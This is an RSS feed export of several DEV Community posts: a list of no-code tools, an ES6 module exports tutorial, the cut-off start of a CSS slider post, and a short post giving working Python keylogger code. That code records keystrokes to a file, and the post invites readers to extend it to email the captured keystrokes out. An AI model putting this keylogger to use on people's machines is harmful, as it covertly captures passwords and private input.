<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>A list of actually useful Nocode tools and I am not talking about site builders.</title>
      <author>Fayaz Ahmed</author>
      <pubDate>Sun, 03 Jan 2021 08:31:36 +0000</pubDate>
      <link>https://dev.to/fayaz/a-list-of-actually-useful-nocode-tools-and-i-am-not-talking-about-site-builders-3m4g</link>
      <guid>https://dev.to/fayaz/a-list-of-actually-useful-nocode-tools-and-i-am-not-talking-about-site-builders-3m4g</guid>
      <description>&lt;p&gt;There's a lot of buzz going around the web dev world regarding Nocode, but a ton of these do the same thing and kind of miss the point of why they are to be used in the first place.&lt;/p&gt;

&lt;p&gt;These tools are not just another Website/App builder, but actual tools that will help you develop/scale your existing apps/websites which solve production use cases.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#1-pwabuilder" class="anchor"&gt;
  &lt;/a&gt;
  1.  &lt;a href="https://www.pwabuilder.com/"&gt;PWABuilder&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--9jUArMWf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/dyubax3rxhmdbxkks01i.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--9jUArMWf--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/dyubax3rxhmdbxkks01i.jpg" alt="PWA Builder"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I have used this and you will be surprised how well it works. The name says PWA Builder, but in fact it makes your PWAs - actual android apps which you can host on the Google play store, these are small light weight apps which are hardly like 1 - 2 MB in size.&lt;/p&gt;

&lt;p&gt;PS, they even have a neat PWA component library, like Auth, Contact Picker, Install component, which you can use in your PWAs.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#2-appsmith" class="anchor"&gt;
  &lt;/a&gt;
  2. &lt;a href="https://www.appsmith.com/"&gt;Appsmith&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--C-HijEDJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/6ocoi9yqcgv3q12zp6ef.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--C-HijEDJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/6ocoi9yqcgv3q12zp6ef.png" alt="Appsmith"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another tool that I have fallen in love with recently, imagine building internal admin panels without code with charts, APIs, form collections, all with a drag and drop interface.&lt;/p&gt;

&lt;p&gt;You can even connect it directly to your Mysql, PGSQL databased right within this tool.&lt;/p&gt;

&lt;p&gt;I am surprised by how many complex use cases it handles.&lt;/p&gt;

&lt;p&gt;PS - it's all &lt;a href="https://github.com/appsmithorg/appsmith"&gt;open source&lt;/a&gt; and they even have the hosted version for free(for now).&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#3-nocodeapi" class="anchor"&gt;
  &lt;/a&gt;
  3. &lt;a href="https://nocodeapi.com"&gt;NoCodeApi&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UfpmkoLP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/rfh9qz3j3y0xdprv4at8.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UfpmkoLP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/rfh9qz3j3y0xdprv4at8.jpg" alt="NoCodeApi"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I have been seeing NoCodeApi being built and grow since the beginning and I cannot stress enough how useful and polished this tool is, you need not read the docs of third party APIs, set up separate servers, write code, handle auth, tokens, API keys etc. All you need is an account and just get started using APIs from Google, Instagram, Twitter, Airtable, Slack and there are literally tons of other platform APIs you can use in your projects.&lt;/p&gt;

&lt;p&gt;PS, I have seen the next update of NoCodeApi and Danish is making something really amazing for developers called Dev APIs.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#4-pipedream" class="anchor"&gt;
  &lt;/a&gt;
  4. &lt;a href="https://pipedream.com/"&gt;Pipedream&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--CKdvTAMA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/nbqgrummqd2hn6q553wf.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--CKdvTAMA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/nbqgrummqd2hn6q553wf.jpg" alt="Pipedream"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I am not exactly sure what to call this platform, because it does so many things you won't believe. Think of it like Zapier + IFTTT + Glitch + Firebase Database combines.&lt;/p&gt;

&lt;p&gt;It has all the automation magic and it gives you the complete flexibility of writing code, it even lets you add/edit their own hooks. Pipedream even allows you to save data on an actual database&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#5-letter" class="anchor"&gt;
  &lt;/a&gt;
  5. &lt;a href="https://letter.so/"&gt;Letter&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--AFErIyir--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/v0meu9w6nbejt3j302bo.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--AFErIyir--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/v0meu9w6nbejt3j302bo.png" alt="Letter"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;People sending newsletters, you know how hard it is to make good looking emails, letter is simple yet powerful, it can import data like images, titles, descriptions from links. right in their builder&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#6-mail-4-good" class="anchor"&gt;
  &lt;/a&gt;
  6. &lt;a href="https://github.com/freeCodeCamp/mail-for-good"&gt;Mail 4 Good&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s---ZEffyvS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/138x41e3jrovr0kw9m1a.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s---ZEffyvS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/138x41e3jrovr0kw9m1a.jpg" alt="Mail4Good"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;For sending 10,000 emails, Mailchimp charges you $200, Mail4Good does it for $1 (I am not kidding). The thing is you need to host it yourself, it is open source and it uses Amazon SES behind the curtains which makes it so cheap.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#7-descript" class="anchor"&gt;
  &lt;/a&gt;
  7. &lt;a href="https://www.descript.com/"&gt;Descript&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--QEGAKZo1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/lptg15qvh2wdjr9618mn.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--QEGAKZo1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/lptg15qvh2wdjr9618mn.jpg" alt="Descript"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Descript is like magic for Independent video makers, it generates a transcript, editing videos is a breeze with this platform. Their website says &lt;strong&gt;video editor that works like a doc&lt;/strong&gt; and I could not agree more.&lt;/p&gt;

&lt;p&gt;Just look at their demo video and you will understand what I am talking about.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#8bannerbear" class="anchor"&gt;
  &lt;/a&gt;
  8.&lt;a href="https://www.bannerbear.com/"&gt;BannerBear&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--u_Xl5KJ2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/p8bi4unoac92kteh4i4n.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--u_Xl5KJ2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/p8bi4unoac92kteh4i4n.jpg" alt="BannerBear"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;BannerBear automates Image generation for you, you just need to pass along some parameters to its API, and it will make the poster, image, text embedding, image resizing on the fly. &lt;/p&gt;

&lt;p&gt;You can even generate these images on the bulk by uploading them to Airtable or google sheets.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#9-super" class="anchor"&gt;
  &lt;/a&gt;
  9. &lt;a href="https://super.so/"&gt;Super&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JS4TDI6T--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/x44sqbydbb79m8eb07z8.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JS4TDI6T--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/x44sqbydbb79m8eb07z8.jpg" alt="Super"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Super lets you use Notion as your CMS. It even lets you connect custom domains to the site that is generated.&lt;/p&gt;

&lt;p&gt;Do consider supporting me by buying &lt;a href="https://fayazz.co/coffee"&gt;coffees&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you like my content do follow me on &lt;a href="https://twitter.com/fayazara"&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For paid articles on Javascript, APIs, SDK Integrations etc just DM on my twitter handle.&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>javascript</category>
      <category>programming</category>
    </item>
    <item>
      <title>Named vs. Default Exports in ES6 Modules</title>
      <author>Shane Mitchell</author>
      <pubDate>Sat, 02 Jan 2021 18:08:54 +0000</pubDate>
      <link>https://dev.to/shanesc/named-vs-default-exports-in-es6-modules-1cim</link>
      <guid>https://dev.to/shanesc/named-vs-default-exports-in-es6-modules-1cim</guid>
      <description>&lt;p&gt;JavaScript Modules using ES6 syntax have two different types of exports: &lt;strong&gt;named&lt;/strong&gt; and &lt;strong&gt;default&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;There are differences in how they are declared as well as how they are imported.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#named-exports" class="anchor"&gt;
  &lt;/a&gt;
  Named Exports
&lt;/h2&gt;

&lt;p&gt;Named exports can be used to export several variables from a module. The &lt;code&gt;export&lt;/code&gt; keyword can be used for each variable that you want to export. When importing, you use &lt;a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment"&gt;object destructuring&lt;/a&gt; to assign the exported variables. The imported variables must use the same name as the exports.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// foo.js&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;foo&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;123&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;&lt;code&gt;foo.js&lt;/code&gt; has two named exports, &lt;code&gt;foo&lt;/code&gt; and &lt;code&gt;bar&lt;/code&gt;, which can be imported from any other JavaScript file like:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// anotherComponent.js&lt;/span&gt;

&lt;span class="c1"&gt;// import the foo and bar named exports from foo.js&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./foo&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// both variables can now be used&lt;/span&gt;
&lt;span class="nx"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// logs 'foo' to the console&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;bar&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// logs the number 123 to the console&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;ul&gt;
&lt;li&gt;Named exports can be used to export and import several variables from a module.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;When using named exports, the imported variables must use the same name as the exported variables.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;If you want to rename imported variables, you can use the &lt;code&gt;as&lt;/code&gt; keyword:
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;  &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nx"&gt;myVariable&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./foo&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="nx"&gt;myVariable&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// logs 'foo' to the console&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#default-exports" class="anchor"&gt;
  &lt;/a&gt;
  Default Exports
&lt;/h2&gt;

&lt;p&gt;You can only have one default export in a module. You use the &lt;code&gt;default&lt;/code&gt; keyword to specify which variable is the default export. When importing default exports, any name can be used for variable assignment.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// baz.js&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;baz&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;baz&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="nx"&gt;baz&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Now that &lt;code&gt;baz.js&lt;/code&gt; has defined its default export, any other JavaScript file can import and use the &lt;code&gt;baz&lt;/code&gt; variable by importing as so:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// anotherComponent.js&lt;/span&gt;

&lt;span class="c1"&gt;// import the default export from baz.js&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;bazDefault&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./baz&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// the imported variable can now be used&lt;/span&gt;
&lt;span class="nx"&gt;bazDefault&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// logs 'baz' to the console&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;We've successfully imported &lt;code&gt;baz&lt;/code&gt; into a variable called &lt;code&gt;bazDefault&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Each module can only have one default export&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;You define the default export using the &lt;code&gt;default&lt;/code&gt; keyword.&lt;/li&gt;
&lt;li&gt;When using default exports, we can choose any name for the variable we import into. I chose &lt;code&gt;bazDefault&lt;/code&gt;, but could have just as easily called it &lt;code&gt;baz&lt;/code&gt;, &lt;code&gt;someVariable&lt;/code&gt;, or &lt;code&gt;apples&lt;/code&gt; and it would have been perfectly valid.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#summary" class="anchor"&gt;
  &lt;/a&gt;
  Summary
&lt;/h2&gt;

&lt;p&gt;So that's it, the differences between named and default exports in ES6 and how they are used.&lt;/p&gt;

&lt;p&gt;Key points:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Modules can have several named exports, but only one default export.&lt;/li&gt;
&lt;li&gt;When importing, named exports must use the same name, while default exports can be imported to any name.&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>javascript</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Keylogger in just 20 lines of code</title>
      <author>ablil</author>
      <pubDate>Sat, 02 Jan 2021 17:28:36 +0000</pubDate>
      <link>https://dev.to/ablil/keylogger-in-just-20-lines-of-code-6kk</link>
      <guid>https://dev.to/ablil/keylogger-in-just-20-lines-of-code-6kk</guid>
      <description>&lt;p&gt;I am sure you have already heard the term &lt;strong&gt;keylogger&lt;/strong&gt; since you're a geek and you're visiting this website.&lt;/p&gt;

&lt;p&gt;If you don’t know, let me explain very quickly, a Keylogger as its name indicates, is a &lt;em&gt;tool that captures your keystroke&lt;/em&gt;* and saves them somewhere.&lt;/p&gt;

&lt;p&gt;If you're a pentester, I am sure you have such tools in your bag 💻.&lt;/p&gt;

&lt;p&gt;We are using &lt;strong&gt;python&lt;/strong&gt; as a scripting language and &lt;strong&gt;pynput&lt;/strong&gt; library to capture keyboard events.&lt;/p&gt;

&lt;p&gt;Here is the full code, exactly 20 lines, the code explains itself.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Keylogger&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                                                                          
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;                                                                   
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'/tmp/keylogs.logs'&lt;/span&gt;                                                
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogsfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;'a+'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                                       

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;                                                              
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                                                                              
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogsfile&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                                              
        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="nb"&gt;AttributeError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                                                            
            &lt;span class="n"&gt;special_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                                                        
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;special_key&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;'Key.enter'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                                                
                &lt;span class="n"&gt;special_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;                                                        
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;special_key&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;'Key.space'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                                                
                &lt;span class="n"&gt;special_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;' '&lt;/span&gt;                                                         
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogsfile&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;special_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                                           

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;                                                                        
        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;keyboard&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Listener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;on_press&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                       
            &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;                                                               

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;stop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;                                                                       
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogsfile&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;If you have time, you could extend this code to send captured keystrokes via email periodically 😉&lt;/p&gt;

</description>
      <category>python</category>
      <category>hacking</category>
      <category>penteseting</category>
    </item>
    <item>
      <title>Accessible Circular Sliders</title>
      <author>Mads Stoumann</author>
      <pubDate>Sat, 02 Jan 2021 16:45:39 +0000</pubDate>
      <link>https://dev.to/madsstoumann/accessible-circular-sliders-11p</link>
      <guid>https://dev.to/madsstoumann/accessible-circular-sliders-11p</guid>
      <description>&lt;p&gt;Just a few years ago, it was almost impossible to create range sliders without &lt;em&gt;a lot&lt;/em&gt; of JavaScript. Thankfully, in modern browsers, it's super-easy to style range sliders, using CSS only. If the browser supports &lt;em&gt;CSS Custom Properties&lt;/em&gt;, it's even possible to use the same styles for a wide range of different styles, just by updating a few properties.&lt;/p&gt;

